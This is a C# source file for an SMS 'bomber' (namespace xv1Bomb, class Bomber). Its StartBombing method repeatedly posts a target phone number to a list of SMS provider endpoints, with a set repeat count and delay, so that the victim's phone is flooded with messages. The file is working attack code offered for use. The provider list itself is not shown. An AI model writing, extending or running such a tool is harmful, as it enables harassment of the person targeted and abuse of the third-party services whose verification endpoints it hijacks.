using System.Collections.Generic;
using System.Net.Http;
using System;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

namespace xv1Bomb
{
    public class Bomber
    {
        private readonly ILogger<Bomber> _logger;

        /*public Bomber(ILogger<Bomber> logger) {
            _logger = logger;
        }*/

        public async Task StartBombing(string phoneNumber,CancellationToken ct ,int repeat,int delay)
        {
            HttpClient client = new HttpClient();

            for (int i = 0;i<repeat;i++) {
                foreach (var site in smsProviderRegistry.smsProviders)
                {
                    if (!ct.IsCancellationRequested)
                    {
                        var content = makeContent(phoneNumber, site.json);
                        await client.PostAsync(site.link, content);
                        
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine(site.link);
                        Console.ForegroundColor = ConsoleColor.White;

                        Thread.Sleep(delay);
                    } else break;
                }
            }
        }

        FormUrlEncodedContent makeContent(string phoneNumber, string json) {
            json = json.Replace("@", phoneNumber);
            Console.WriteLine(json);
            return new FormUrlEncodedContent(JsonConvert.DeserializeObject<Dictionary<string,string>>(json));
        }
    }
}